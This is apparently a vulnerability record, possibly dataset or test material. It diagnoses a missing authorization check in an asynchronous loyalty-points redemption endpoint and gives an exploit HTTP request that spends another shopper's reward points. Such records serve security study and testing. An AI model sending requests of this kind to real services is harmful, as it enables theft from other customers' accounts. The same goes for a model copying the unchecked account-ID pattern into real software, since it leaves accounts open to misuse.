diagnosis: The consumer worker deducts loyalty reward points and records a redemption transaction based directly on loyaltyAccountId from the message payload. It fails to verify that initiatorId is authorized to redeem points on behalf of the loyalty account. An attacker can spend other shoppers' reward points at participating merchant stores.
exploit_request:
POST /api/loyalty/redeem-async HTTP/1.1
Host: rewards.retailcoalition.com
Authorization: Bearer <shopper_token>
Content-Type: application/json

{"loyaltyAccountId": "LOYALTY_889012", "pointsToRedeem": 5000, "merchantId": "MCH_COFFEE_01"}
